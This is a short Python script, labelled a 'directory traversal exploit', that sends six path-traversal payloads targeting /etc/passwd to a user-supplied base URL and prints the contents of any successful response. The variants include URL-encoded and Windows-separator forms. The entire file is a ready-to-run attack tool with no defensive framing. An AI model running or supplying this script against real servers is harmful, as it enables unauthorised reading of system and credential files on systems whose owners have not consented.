#!/usr/bin/env python
import requests
import urllib.parse


def generate_payloads():
    payloads = [
        "../../etc/passwd",
        "../../../../../etc/passwd",
        "../../../../etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",  # URL encode
        "..\\..\\..\\..\\etc\\passwd",  # Windows path separator
        "..%5C..%5C..%5Cetc%5Cpasswd"  # Windows path separator with URL encode
    ]
    return payloads


def test_directory_traversal(base_url, payloads):
    for payload in payloads:
        encoded_payload = urllib.parse.quote(payload)
        url = f"{base_url}/{encoded_payload}"

        try:
            response = requests.get(url)
            if response.status_code == 200:
                print(f"[+] Successful: {url}")
                print("Text:")
                print(response.text[:1000])  
                print("-" * 50)
            else:
                print(f"[-] Unreachable: {url} (HTTP Status Code: {response.status_code})")
        except requests.RequestException as e:
            print(f"[-] An error occurred: {e}")


def main():
    base_url = input("Enter Base URL (e.g., http://example.com): ").strip()
    print("Starting directory traversal exploit...")
    payloads = generate_payloads()
    test_directory_traversal(base_url, payloads)


if __name__ == "__main__":
    main()
